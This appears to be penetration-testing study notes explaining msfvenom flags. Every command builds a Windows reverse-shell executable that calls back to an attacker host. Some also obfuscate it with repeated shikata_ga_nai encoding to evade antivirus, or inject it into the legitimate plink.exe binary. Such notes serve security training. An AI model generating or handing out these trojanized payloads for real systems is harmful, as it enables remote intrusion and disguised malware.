Payloads can be exported in various file formats:
- ASP, VBScript, Jar, War, DLL, EXE, etc.

Ex. 
Generating a raw Windows PE Reverse Shell Executable:
`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o
shell_reverse.exe`
**-p** Set payload
**-f** set output format
**-o** set output file name

Encoding a reverse shell payload:
`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e
x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe`
**-e** Specify encoder type
**-i** Set number of iterations

Injecting a payload into an existing PE file, plink.exe:
`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e
x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o
shell_reverse_msf_encoded_embedded.exe`
**-x** Set file to inject into

Alternative way to inject into an existing file with **generate**:
`generate -f exe -e x86/shikata_ga_nai -i 9 -
x /usr/share/windows-resources/binaries/plink.exe -o
shell_reverse_msf_encoded_embedded.exe`

